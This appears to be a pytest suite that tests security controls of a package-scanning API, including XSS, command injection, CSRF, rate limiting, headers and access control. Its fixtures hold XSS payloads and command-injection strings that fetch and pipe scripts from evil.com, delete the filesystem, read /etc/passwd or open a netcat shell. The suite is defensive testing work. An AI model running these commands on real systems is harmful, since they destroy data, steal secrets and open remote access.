"""
Comprehensive Security Testing Suite

Tests all security controls including XSS protection, command injection prevention,
CSRF protection, rate limiting, input validation, and security headers.
"""

from __future__ import annotations

import json
import time
from typing import Any

import pytest
from fastapi.testclient import TestClient

from api.config import settings


class TestXSSProtection:
    """Test XSS prevention measures across all user inputs."""

    @pytest.fixture
    def xss_payloads(self) -> list[str]:
        """Common XSS payloads for testing."""
        return [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "';alert('XSS');//",
            "<iframe src='javascript:alert(`XSS`)'></iframe>",
            "<%73%63%72%69%70%74>alert('XSS')</script>",
            "<script>eval(atob('YWxlcnQoJ1hTUycpOw=='))</script>",
            "'-alert('XSS')-'",
            "\"><script>alert('XSS')</script>",
        ]

    def test_user_registration_xss_protection(
        self, client: TestClient, xss_payloads: list[str]
    ):
        """Test XSS protection in user registration fields."""
        for payload in xss_payloads:
            registration_data = {
                "email": f"test@example.com",
                "password": "ValidPassword123!",
                "name": payload,  # XSS payload in name field
            }
            
            resp = client.post("/v1/auth/register", json=registration_data)
            
            # Should either sanitize or reject the payload
            if resp.status_code == 201:
                # If accepted, ensure it's sanitized
                user_data = resp.json()
                assert "<script>" not in user_data.get("user", {}).get("name", "")
                assert "javascript:" not in user_data.get("user", {}).get("name", "")
            else:
                # Should be rejected with proper error
                assert resp.status_code in [400, 422]

    def test_scan_target_xss_protection(
        self, client: TestClient, auth_headers: dict[str, str], xss_payloads: list[str]
    ):
        """Test XSS protection in scan target fields."""
        for payload in xss_payloads:
            scan_data = {
                "target": payload,
                "target_type": "npm",
                "files_scanned": 5,
                "findings": [],
                "metadata": {"version": "1.0.0"},
            }
            
            resp = client.post("/v1/scans", json=scan_data, headers=auth_headers)
            
            if resp.status_code == 201:
                # If accepted, verify target is sanitized
                scan_response = resp.json()
                assert "<script>" not in scan_response.get("target", "")
                assert "javascript:" not in scan_response.get("target", "")

    def test_threat_report_xss_protection(
        self, client: TestClient, auth_headers: dict[str, str], xss_payloads: list[str]
    ):
        """Test XSS protection in threat reporting."""
        for payload in xss_payloads:
            report_data = {
                "threat_type": "malware",
                "package_name": "test-package",
                "package_version": "1.0.0",
                "description": payload,
                "evidence": {"file": "test.js", "content": "malicious content"},
            }
            
            resp = client.post("/v1/report", json=report_data, headers=auth_headers)
            
            if resp.status_code == 201:
                # Verify description is sanitized
                assert "<script>" not in str(resp.json().get("description", ""))


class TestCommandInjection:
    """Test command injection prevention in all user inputs."""

    @pytest.fixture
    def injection_payloads(self) -> list[str]:
        """Command injection payloads."""
        return [
            "; rm -rf /",
            "$(rm -rf /)",
            "`rm -rf /`",
            "| cat /etc/passwd",
            "&& curl evil.com/steal",
            "; wget evil.com/malware.sh | bash",
            "$(curl -s evil.com/payload)",
            "`wget -O - evil.com/script | sh`",
            "; python -c 'import os; os.system(\"rm -rf /\")'",
            "|| nc -l -p 1234 -e /bin/bash",
        ]

    def test_package_name_injection_protection(
        self, client: TestClient, auth_headers: dict[str, str], injection_payloads: list[str]
    ):
        """Test command injection protection in package names."""
        for payload in injection_payloads:
            scan_data = {
                "target": payload,
                "target_type": "npm",
                "files_scanned": 5,
                "findings": [],
                "metadata": {},
            }
            
            resp = client.post("/v1/scans", json=scan_data, headers=auth_headers)
            
            # Should reject dangerous characters or sanitize
            if resp.status_code not in [400, 422]:
                # If accepted, verify no shell metacharacters remain
                scan_response = resp.json()
                target = scan_response.get("target", "")
                assert ";" not in target
                assert "|" not in target
                assert "&" not in target
                assert "$(" not in target
                assert "`" not in target

    def test_publisher_verification_injection_protection(
        self, client: TestClient, auth_headers: dict[str, str], injection_payloads: list[str]
    ):
        """Test command injection in publisher verification."""
        for payload in injection_payloads:
            verify_data = {
                "package_name": payload,
                "package_version": "1.0.0",
                "publisher": "test-publisher",
                "registry_url": "https://registry.npmjs.org/",
            }
            
            resp = client.post("/v1/verify", json=verify_data, headers=auth_headers)
            
            # Should not allow command execution
            assert resp.status_code in [400, 422, 500]  # Should fail safely


class TestCSRFProtection:
    """Test CSRF protection measures."""

    def test_state_changing_operations_require_valid_origin(self, client: TestClient):
        """Test that state-changing operations validate origin headers."""
        # Test without Origin header
        scan_data = {
            "target": "test-package",
            "target_type": "npm",
            "files_scanned": 5,
            "findings": [],
            "metadata": {},
        }
        
        # Should require authentication anyway, but let's test CSRF protection
        resp = client.post("/v1/scans", json=scan_data)
        assert resp.status_code in [401, 403]  # Should require auth

    def test_malicious_origin_rejection(
        self, client: TestClient, auth_headers: dict[str, str]
    ):
        """Test rejection of requests from malicious origins."""
        malicious_headers = {
            **auth_headers,
            "Origin": "https://evil.com",
            "Referer": "https://evil.com/attack.html",
        }
        
        scan_data = {
            "target": "test-package",
            "target_type": "npm",
            "files_scanned": 5,
            "findings": [],
            "metadata": {},
        }
        
        # Should be rejected due to CORS policy
        resp = client.post("/v1/scans", json=scan_data, headers=malicious_headers)
        # The exact status depends on CORS configuration
        # In production, this should be blocked


class TestRateLimiting:
    """Test rate limiting effectiveness."""

    def test_global_rate_limiting(self, client: TestClient):
        """Test global rate limiting per IP."""
        # Make rapid requests to trigger rate limiting
        responses = []
        
        for i in range(250):  # Exceed the 200 req/min limit
            resp = client.get("/health")
            responses.append(resp.status_code)
            
        # Should eventually get rate limited
        rate_limited = any(status == 429 for status in responses)
        assert rate_limited, "Rate limiting not triggered after 250 requests"

    def test_authenticated_endpoint_rate_limiting(
        self, client: TestClient, auth_headers: dict[str, str]
    ):
        """Test rate limiting on authenticated endpoints."""
        responses = []
        
        for i in range(100):
            resp = client.get("/v1/scans", headers=auth_headers)
            responses.append(resp.status_code)
            
        # Should handle normal load but prevent abuse
        success_count = sum(1 for status in responses if status == 200)
        assert success_count > 50, "Too aggressive rate limiting on normal usage"

    def test_rate_limit_headers(self, client: TestClient):
        """Test that rate limit headers are properly set."""
        resp = client.get("/health")
        
        # Should include rate limiting information in headers
        # (Specific headers depend on rate limiting implementation)
        assert resp.status_code in [200, 429]


class TestInputValidation:
    """Test input validation and boundary conditions."""

    def test_oversized_payload_rejection(
        self, client: TestClient, auth_headers: dict[str, str]
    ):
        """Test rejection of oversized payloads."""
        # Create an extremely large payload
        huge_findings = []
        for i in range(10000):  # Very large number of findings
            huge_findings.append({
                "phase": "code_patterns",
                "rule": "test-rule",
                "severity": "HIGH",
                "file": f"file_{i}.js",
                "line": i,
                "snippet": "x" * 1000,  # Large snippet
                "weight": 1.0,
            })
        
        scan_data = {
            "target": "test-package",
            "target_type": "npm",
            "files_scanned": 10000,
            "findings": huge_findings,
            "metadata": {},
        }
        
        resp = client.post("/v1/scans", json=scan_data, headers=auth_headers)
        
        # Should reject oversized payloads
        assert resp.status_code in [413, 422, 400]

    def test_invalid_email_format_rejection(self, client: TestClient):
        """Test email validation in registration."""
        invalid_emails = [
            "not-an-email",
            "@domain.com",
            "user@",
            "user@domain",
            "user..user@domain.com",
            " user@domain.com ",
            "user@domain..com",
        ]
        
        for email in invalid_emails:
            registration_data = {
                "email": email,
                "password": "ValidPassword123!",
                "name": "Test User",
            }
            
            resp = client.post("/v1/auth/register", json=registration_data)
            assert resp.status_code == 422, f"Invalid email {email} was accepted"

    def test_weak_password_rejection(self, client: TestClient):
        """Test password strength requirements."""
        weak_passwords = [
            "123456",
            "password",
            "abc",
            "ALLUPPERCASE",
            "alllowercase",
            "NoNumbers",
            "12345678",  # Only numbers
        ]
        
        for password in weak_passwords:
            registration_data = {
                "email": "test@example.com",
                "password": password,
                "name": "Test User",
            }
            
            resp = client.post("/v1/auth/register", json=registration_data)
            assert resp.status_code == 422, f"Weak password {password} was accepted"


class TestSecurityHeaders:
    """Test security headers are properly set."""

    def test_security_headers_present(self, client: TestClient):
        """Test that all required security headers are present."""
        resp = client.get("/health")
        
        # Check for security headers
        assert resp.headers.get("X-Content-Type-Options") == "nosniff"
        assert resp.headers.get("X-Frame-Options") == "DENY"
        assert resp.headers.get("X-XSS-Protection") == "1; mode=block"
        assert resp.headers.get("Referrer-Policy") == "strict-origin-when-cross-origin"
        
        # HSTS should be present in non-debug mode
        if not settings.debug:
            hsts = resp.headers.get("Strict-Transport-Security")
            assert hsts is not None
            assert "max-age=31536000" in hsts
            assert "includeSubDomains" in hsts

    def test_content_type_enforcement(self, client: TestClient):
        """Test that Content-Type header is enforced for JSON endpoints."""
        # Try to send JSON data with wrong content type
        scan_data = '{"target": "test", "target_type": "npm", "files_scanned": 1, "findings": []}'
        
        resp = client.post(
            "/v1/scans",
            data=scan_data,
            headers={"Content-Type": "text/plain"},
        )
        
        # Should reject requests with wrong content type
        assert resp.status_code == 422


class TestAuthenticationSecurity:
    """Test authentication security measures."""

    def test_jwt_token_expiration(self, client: TestClient, test_user_data: dict[str, str]):
        """Test that JWT tokens properly expire."""
        # Register and login
        resp = client.post("/v1/auth/register", json=test_user_data)
        assert resp.status_code == 201
        
        login_data = {
            "email": test_user_data["email"],
            "password": test_user_data["password"],
        }
        resp = client.post("/v1/auth/login", json=login_data)
        assert resp.status_code == 200
        
        token_data = resp.json()
        access_token = token_data["access_token"]
        
        # Token should be valid initially
        headers = {"Authorization": f"Bearer {access_token}"}
        resp = client.get("/v1/auth/me", headers=headers)
        assert resp.status_code == 200

    def test_invalid_token_rejection(self, client: TestClient):
        """Test rejection of invalid tokens."""
        invalid_tokens = [
            "invalid.token.here",
            "Bearer invalid",
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalid.signature",
            "",
            "malformed-token",
        ]
        
        for token in invalid_tokens:
            headers = {"Authorization": f"Bearer {token}"}
            resp = client.get("/v1/auth/me", headers=headers)
            assert resp.status_code == 401, f"Invalid token {token} was accepted"

    def test_password_hashing_security(self, client: TestClient, test_user_data: dict[str, str]):
        """Test that passwords are properly hashed."""
        # Register user
        resp = client.post("/v1/auth/register", json=test_user_data)
        assert resp.status_code == 201
        
        # Attempt login with plaintext password should work
        login_data = {
            "email": test_user_data["email"],
            "password": test_user_data["password"],
        }
        resp = client.post("/v1/auth/login", json=login_data)
        assert resp.status_code == 200
        
        # Verify password is not stored in plaintext by attempting direct hash login
        # (This is more of a database-level test, but validates the concern)


class TestDataSanitization:
    """Test data sanitization and output encoding."""

    def test_error_message_sanitization(self, client: TestClient):
        """Test that error messages don't leak sensitive information."""
        # Try to trigger various error conditions
        error_triggers = [
            ("GET", "/nonexistent-endpoint"),
            ("POST", "/v1/auth/login", {"invalid": "data"}),
            ("POST", "/v1/scans", {"malformed": "payload"}),
        ]
        
        for method, url, *data in error_triggers:
            if method == "GET":
                resp = client.get(url)
            else:
                resp = client.post(url, json=data[0] if data else {})
            
            # Error responses should not contain sensitive information
            error_text = resp.text.lower()
            
            # Check for common information disclosure patterns
            assert "traceback" not in error_text
            assert "database" not in error_text
            assert "password" not in error_text
            assert "secret" not in error_text
            assert "internal error" in error_text or "bad request" in error_text

    def test_response_data_sanitization(
        self, client: TestClient, auth_headers: dict[str, str]
    ):
        """Test that response data doesn't include sensitive fields."""
        resp = client.get("/v1/auth/me", headers=auth_headers)
        
        if resp.status_code == 200:
            user_data = resp.json()
            
            # Should not include sensitive fields
            assert "password" not in user_data
            assert "password_hash" not in user_data
            assert "jwt_secret" not in user_data


class TestBusinessLogicSecurity:
    """Test business logic security controls."""

    def test_unauthorized_scan_access(
        self, client: TestClient, auth_headers: dict[str, str]
    ):
        """Test that users can't access other users' scans."""
        # Create a scan with first user
        scan_data = {
            "target": "test-package",
            "target_type": "npm",
            "files_scanned": 5,
            "findings": [],
            "metadata": {},
        }
        
        resp = client.post("/v1/scans", json=scan_data, headers=auth_headers)
        if resp.status_code != 201:
            return  # Skip if scan creation fails
            
        scan_id = resp.json().get("id")
        
        # Register a second user
        second_user_data = {
            "email": "second@example.com",
            "password": "SecondPassword123!",
            "name": "Second User",
        }
        
        resp = client.post("/v1/auth/register", json=second_user_data)
        if resp.status_code != 201:
            return  # Skip if registration fails
            
        second_token = resp.json()["access_token"]
        second_headers = {"Authorization": f"Bearer {second_token}"}
        
        # Second user should not be able to access first user's scan
        resp = client.get(f"/v1/scans/{scan_id}", headers=second_headers)
        assert resp.status_code in [403, 404], "User can access other user's scan"

    def test_privilege_escalation_prevention(
        self, client: TestClient, auth_headers: dict[str, str]
    ):
        """Test that users cannot escalate their privileges."""
        # Try to access admin-only endpoints (if any exist)
        admin_endpoints = [
            "/v1/admin/users",
            "/v1/admin/scans",
            "/admin",
            "/internal",
        ]
        
        for endpoint in admin_endpoints:
            resp = client.get(endpoint, headers=auth_headers)
            # Should be forbidden or not found (not a server error)
            assert resp.status_code in [403, 404], f"Access granted to {endpoint}"